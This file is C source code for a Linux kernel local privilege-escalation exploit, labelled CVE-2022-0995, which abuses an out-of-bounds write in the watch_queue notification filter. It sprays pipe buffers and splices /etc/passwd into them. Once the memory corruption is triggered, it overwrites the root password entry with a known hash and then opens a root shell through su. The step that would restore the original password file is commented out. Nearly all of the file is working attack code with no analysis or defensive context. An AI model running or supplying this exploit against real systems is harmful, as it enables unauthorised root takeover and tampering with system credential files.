// gcc exploit.c -o exploit -no-pie -static -masm=intel
#define _GNU_SOURCE
#include <err.h>
#include <errno.h>
#include <inttypes.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <linux/watch_queue.h>
#include <sys/syscall.h>
// #include<fcntl.h>

#define PRIMARY_MSG_SIZE 96
#define SECONDARY_MSG_SIZE 0x400

#define PRIMARY_MSG_TYPE    0x41
#define SECONDARY_MSG_TYPE  0x42
#define VICTIM_MSG_TYPE     0x1337
#define MSG_TAG     0xAAAAAAAA

#define SOCKET_NUM 16
#define SK_BUFF_NUM 128
#define PIPE_NUM 500

#define CLOSE printf("\033[0m");
#define RED printf("\033[31m");
#define GREEN printf("\033[36m");
#define BLUE printf("\033[34m");

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[+]status has been saved.");
}

struct list_head
{
    uint64_t    next;
    uint64_t    prev;
};

struct msg_msg
{
    struct list_head m_list;
    uint64_t    m_type;
    uint64_t    m_ts;
    uint64_t    next;
    uint64_t    security;
};

struct msg_msgseg
{
    uint64_t    next;
};

struct 
{
    long mtype;
    char mtext[PRIMARY_MSG_SIZE - sizeof(struct msg_msg)];
}primary_msg;

struct 
{
    long mtype;
    char mtext[SECONDARY_MSG_SIZE - sizeof(struct msg_msg)];
}secondary_msg;

// sizeof(struct skb_shared_info) = 0x140     1024-0x140 = 704
char fake_secondary_msg[704];

struct
{
    long mtype;
    char mtext[0x1000 - sizeof(struct msg_msg) + 0x1000 - sizeof(struct msg_msgseg)];
} oob_msg;

struct pipe_buffer
{
    uint64_t    page;
    uint32_t    offset, len;
    uint64_t    ops;
    uint32_t    flags;
    uint32_t    padding;
    uint64_t    private;
};

struct pipe_buf_operations
{
    uint64_t    confirm;
    uint64_t    release;
    uint64_t    try_steal;
    uint64_t    get;
};

void errExit(char *msg)
{
    printf("[-] Error: %s\n", msg);
    exit(EXIT_FAILURE);
}



void get_shell(void)
{
    if (getuid())
        errExit("failed to gain the root!");
    printf("[+] Success! Pop root shell now...\n");
    syscall(SYS_execve, "/bin/sh", 0, 0);
}

void oob_write(int pipe_fd[2])
{
    struct watch_notification_filter *wfilter;
    unsigned int nfilters;
    
    nfilters = 4;
    wfilter = (struct watch_notification_filter*)
            calloc(1, sizeof(struct watch_notification_filter)
                + nfilters * sizeof(struct watch_notification_type_filter));
    wfilter->nr_filters = nfilters;

    // normal filter
    for (int i = 0; i < (nfilters - 1); i++)
        wfilter->filters[i].type = 1;
    
    // evil filter
    // 0x300 = 8 * 96 bytes
    // 1 << 0xa = 0x400, maybe we can hit a proper bit
    wfilter->filters[nfilters - 1].type = 0x3c4;

    // triger oob write
    if (ioctl(pipe_fd[0], IOC_WATCH_QUEUE_SET_FILTER, wfilter) < 0)
        errExit("failed to ioctl IOC_WATCH_QUEUE_SET_FILTER!");
    
    // prevent memory leak in userspace(no need in fact)
    free(wfilter);
}


int main(int argc, char **argv, char **envp)
{
    int         oob_pipe_fd[2];
    char        tmp[0x1000];
    int         sk_sockets[SOCKET_NUM][2];
    int         pipe_fd[PIPE_NUM][2];
    int         tmp_fd[2];
    int         victim_qid, real_qid;
    struct msg_msg  *nearby_msg;
    struct msg_msg  *nearby_msg_prim;
    struct pipe_buffer *pipe_buf_ptr;
    struct pipe_buf_operations *ops_ptr;
    uint64_t    victim_addr;
    uint64_t    kernel_base;
    uint64_t    kernel_offset;
    uint64_t    *rop_chain;
    int         rop_idx;
    cpu_set_t   cpu_set;
    long			page_size;
	size_t			offset_in_file;
	size_t 			data_size;
	int 			target_file_fd;
	struct stat 	target_file_stat;
	// int				pipe_fd[2];
	int 			pipe_size;
	char 			*buffer;
	int 			retval;






    target_file_fd = open("/etc/passwd", O_RDONLY);
    if (target_file_fd < 0)
		errExit("Failed to open the pwd file");

    if (fstat(target_file_fd, &target_file_stat))
		errExit("Failed to get the info of the target file!");
    page_size = sysconf(_SC_PAGE_SIZE);
// 0. initialize: set affinity  &  create vul pipe  &  create skb socket
    CPU_ZERO(&cpu_set);
    CPU_SET(0, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);

    // pipe to trigert off-by-null
    if (pipe2(oob_pipe_fd, O_NOTIFICATION_PIPE) < 0)
        errExit("failed to create O_NOTIFICATION_PIPE!");
    
    RED puts("[*]CVE-2022-0995 by Lotus"); CLOSE
    puts("[*] spray pipe_buffer...");
    for (int i = 0; i < PIPE_NUM; i++)
    {
        if (pipe(pipe_fd[i]) < 0)
        {
            printf("failed to create pipe:%d!\n",i);
            return -1;
        }

        
        int pipe_size = fcntl(pipe_fd[i][1], F_GETPIPE_SZ);
        char *buffer = (char*) malloc(page_size);

        for (int size_left = pipe_size; size_left > 0; )
        {
            int per_write = size_left > page_size ? page_size : size_left;
            size_left -= write(pipe_fd[i][1], buffer, per_write);
        }

        for (int size_left = pipe_size; size_left > 0; )
        {
            int per_read = size_left > page_size ? page_size : size_left;
            size_left -= read(pipe_fd[i][0], buffer, per_read);
        }
        

        // write something to activate it
        // if (write(pipe_fd[i][1], "bsauce00", 8) < 0)
        //     errExit("failed to write the pipe!");
    }

    puts("[+]edit the pipe_buffer size to 0x60");
    for(int i=0;i<PIPE_NUM;i++)
    {
        if (fcntl(pipe_fd[i][1], F_SETPIPE_SZ, 0x1000 * 2) < 0) {
            printf("[x] failed to extend %d pipe!\n",i);
            return -1;
        }

        // if (write(pipe_fd[i][1], "Lotus\x00\x00\x00", 8) < 0)
        //     errExit("failed to write the pipe!");
    }
    // read(target_file_fd,tmp,0x20);
    // printf("%s",tmp);
    // getchar();
    
    for(int i=0;i<PIPE_NUM;i++)
    {
        offset_in_file=3;
        int retval = splice(target_file_fd, &offset_in_file, pipe_fd[i][1], NULL, 1, 0);
	    if (retval < 0)
        {
		    printf("splice failed:%d!\n",i);
            return -1;
        }
	    else if (retval == 0)
        {
            printf("short splice:%d!\n",i);
            return -1;
        }
		
    }

    puts("\033[32m\033[1m[+] File splice done.\033[0m");
    

    
    // 5-3 spray pipe_buffer
    

    // getchar();
    puts("[*] Create 4 holes in pipe_buffer...");
    for (int i = 0; i < PIPE_NUM; i += (500/4))
    {
        close(pipe_fd[i][0]);
        close(pipe_fd[i][1]);
    }
    puts("[+] Trigger OOB");
    oob_write(oob_pipe_fd);
    puts("[+] Save the /etc/passwd to /tmp/passwd.bak");
    system("cp /etc/passwd /tmp/passwd.bak");

    char *data = ":$1$Lotus$TzwLEwMAk3C7fXk4o9atu0:0:0:test:/root:/bin/sh\n"; // openssl passwd -1 -salt Lotus Lotus
    printf("Setting root password to \"Lotus\"...\n");
    data_size = strlen(data);

    char *cmd[] = {"/bin/sh", "-c", "(echo Lotus; cat) | su - -c \""
                // "echo \\\"Restoring /etc/passwd from /tmp/passwd.bak...\\\";"
                // "cp /tmp/passwd.bak /etc/passwd;"
                "echo \\\"Done! Popping shell... (run commands now)\\\";"
                "/bin/sh;"
            "\" root"};

    BLUE puts("[+] write into /etc/pwd and get_shell"); CLOSE

    for (int i = 0; i < PIPE_NUM; i++)
    {
        if(i%(500/4)!=0)
        {
            int retval = write(pipe_fd[i][1], data,data_size);
            if (retval < 0)
            {
                printf("Write failed:%d!",i);
                return -1;
            }
            else if (retval < data_size)
                {
                    printf("short write:%d!",i);
                return -1;
                }
        }
    }

    execv("/bin/sh", cmd);
    
}
